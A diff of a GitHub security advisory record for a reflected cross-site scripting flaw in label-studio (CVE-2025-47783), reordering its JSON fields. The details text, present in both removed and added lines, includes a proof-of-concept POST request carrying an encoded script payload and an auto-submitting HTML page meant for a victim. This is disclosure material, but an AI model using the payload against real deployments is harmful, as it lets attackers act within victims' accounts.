@@ -1,49 +1,16 @@
 {
-  "id": "GHSA-8jhr-wpcm-hh4h",
-  "summary": "label-studio vulnerable to Cross-Site Scripting (Reflected) via the label_config parameter.",
-  "details": "### Summary\nThe vulnerability allows an attacker to inject a malicious script into the context of a web page, which can lead to data theft, unauthorized actions on behalf of the user, and other attacks.\n\n### Details\nThe vulnerability is reproducible when sending a properly formatted request to the `POST /projects/upload-example/` endpoint. In the source code, the vulnerability is located at `label_studio/projects/views.py`.\n```python\n39: @require_http_methods(['POST'])\n40: def upload_example_using_config(request):\n41:     \"\"\"Generate upload data example by config only\"\"\"\n42:     config = request.POST.get('label_config', '')\n43: \n44:     org_pk = get_organization_from_request(request)\n45:     secure_mode = False\n46:     if org_pk is not None:\n47:         org = generics.get_object_or_404(Organization, pk=org_pk)\n48:         secure_mode = org.secure_mode\n49: \n50:     try:\n51:         Project.validate_label_config(config)\n52:         task_data, _, _ = get_sample_task(config, secure_mode)\n53:         task_data = playground_replacements(request, task_data)\n54:     except (ValueError, ValidationError, lxml.etree.Error):\n55:         response = HttpResponse('error while example generating', status=status.HTTP_400_BAD_REQUEST)\n56:     else:\n57:         response = HttpResponse(json.dumps(task_data))\n58:     return response\n```\nThe vulnerability is specifically located in line 57, where HttpResponse is used.\n```python\n57:         response = HttpResponse(json.dumps(task_data))\n```\n### PoC\nSend the following request after changing the `{host}` to your own.\n```css\nPOST /projects/upload-example/ HTTP/1.1\nHost: {host}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 67\n\nlabel_config=%3cView%3e%3cText%20name%3d%22text%22%20value%3d%22$textjmwwi%26lt%3bscript%26gt%3balert(1)%26lt%3b%2fscript%26gt%3bs8m37%22%2f%3e%3c%2fView%3e\n```\nOr you can create a vulnerable HTML page by changing `{domain}` beforehand, which can later be sent to the victim.\n```html\n<html>\n  <body>\n    <form action=\"http://{domain}/projects/upload-example/\" method=\"POST\">\n      <input type=\"hidden\" name=\"label&#95;config\" value=\"&lt;View&gt;&lt;Text&#32;name&#61;&quot;text&quot;&#32;value&#61;&quot;&#36;textjmwwi&amp;lt&#59;script&amp;gt&#59;alert&#40;1&#41;&amp;lt&#59;&#47;script&amp;gt&#59;s8m37&quot;&#47;&gt;&lt;&#47;View&gt;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n```\n### Impact\n- Malicious code execution: The user may be forced to perform unwanted actions within their Label Studio account. This includes accessing `document.cookie`, but note that Label Studio session cookies are marked http-only, mitigating any possibility of session theft.",
-  "aliases": [
-    "CVE-2025-47783"
-  ],
-  "modified": "2025-05-15T16:59:30.646075Z",
-  "published": "2025-05-15T16:21:16Z",
-  "database_specific": {
-    "nvd_published_at": "2025-05-14T23:15:48Z",
-    "cwe_ids": [
-      "CWE-79"
-    ],
-    "severity": "HIGH",
-    "github_reviewed": true,
-    "github_reviewed_at": "2025-05-15T16:21:16Z"
-  },
-  "references": [
-    {
-      "type": "WEB",
-      "url": "https://github.com/HumanSignal/label-studio/security/advisories/GHSA-8jhr-wpcm-hh4h"
-    },
-    {
-      "type": "ADVISORY",
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-47783"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/HumanSignal/label-studio/commit/97db9e7b16783e1f6052eb432a6f014f80ef268d"
-    },
-    {
-      "type": "PACKAGE",
-      "url": "https://github.com/HumanSignal/label-studio"
-    }
-  ],
   "affected": [
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/05/GHSA-8jhr-wpcm-hh4h/GHSA-8jhr-wpcm-hh4h.json"
+      },
       "package": {
-        "name": "label-studio",
         "ecosystem": "PyPI",
+        "name": "label-studio",
         "purl": "pkg:pypi/label-studio"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -51,7 +18,8 @@
             {
               "fixed": "1.18.0"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -145,17 +113,49 @@
         "1.9.1.post0",
         "1.9.2",
         "1.9.2.post0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/05/GHSA-8jhr-wpcm-hh4h/GHSA-8jhr-wpcm-hh4h.json"
-      }
+      ]
+    }
+  ],
+  "aliases": [
+    "CVE-2025-47783"
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2025-05-15T16:21:16Z",
+    "nvd_published_at": "2025-05-14T23:15:48Z",
+    "severity": "HIGH"
+  },
+  "details": "### Summary\nThe vulnerability allows an attacker to inject a malicious script into the context of a web page, which can lead to data theft, unauthorized actions on behalf of the user, and other attacks.\n\n### Details\nThe vulnerability is reproducible when sending a properly formatted request to the `POST /projects/upload-example/` endpoint. In the source code, the vulnerability is located at `label_studio/projects/views.py`.\n```python\n39: @require_http_methods(['POST'])\n40: def upload_example_using_config(request):\n41:     \"\"\"Generate upload data example by config only\"\"\"\n42:     config = request.POST.get('label_config', '')\n43: \n44:     org_pk = get_organization_from_request(request)\n45:     secure_mode = False\n46:     if org_pk is not None:\n47:         org = generics.get_object_or_404(Organization, pk=org_pk)\n48:         secure_mode = org.secure_mode\n49: \n50:     try:\n51:         Project.validate_label_config(config)\n52:         task_data, _, _ = get_sample_task(config, secure_mode)\n53:         task_data = playground_replacements(request, task_data)\n54:     except (ValueError, ValidationError, lxml.etree.Error):\n55:         response = HttpResponse('error while example generating', status=status.HTTP_400_BAD_REQUEST)\n56:     else:\n57:         response = HttpResponse(json.dumps(task_data))\n58:     return response\n```\nThe vulnerability is specifically located in line 57, where HttpResponse is used.\n```python\n57:         response = HttpResponse(json.dumps(task_data))\n```\n### PoC\nSend the following request after changing the `{host}` to your own.\n```css\nPOST /projects/upload-example/ HTTP/1.1\nHost: {host}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 67\n\nlabel_config=%3cView%3e%3cText%20name%3d%22text%22%20value%3d%22$textjmwwi%26lt%3bscript%26gt%3balert(1)%26lt%3b%2fscript%26gt%3bs8m37%22%2f%3e%3c%2fView%3e\n```\nOr you can create a vulnerable HTML page by changing `{domain}` beforehand, which can later be sent to the victim.\n```html\n<html>\n  <body>\n    <form action=\"http://{domain}/projects/upload-example/\" method=\"POST\">\n      <input type=\"hidden\" name=\"label&#95;config\" value=\"&lt;View&gt;&lt;Text&#32;name&#61;&quot;text&quot;&#32;value&#61;&quot;&#36;textjmwwi&amp;lt&#59;script&amp;gt&#59;alert&#40;1&#41;&amp;lt&#59;&#47;script&amp;gt&#59;s8m37&quot;&#47;&gt;&lt;&#47;View&gt;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n```\n### Impact\n- Malicious code execution: The user may be forced to perform unwanted actions within their Label Studio account. This includes accessing `document.cookie`, but note that Label Studio session cookies are marked http-only, mitigating any possibility of session theft.",
+  "id": "GHSA-8jhr-wpcm-hh4h",
+  "modified": "2025-05-15T16:59:30.646075Z",
+  "published": "2025-05-15T16:21:16Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/HumanSignal/label-studio/security/advisories/GHSA-8jhr-wpcm-hh4h"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-47783"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HumanSignal/label-studio/commit/97db9e7b16783e1f6052eb432a6f014f80ef268d"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/HumanSignal/label-studio"
     }
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V4",
-      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N"
+      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N",
+      "type": "CVSS_V4"
     }
-  ]
+  ],
+  "summary": "label-studio vulnerable to Cross-Site Scripting (Reflected) via the label_config parameter."
 }
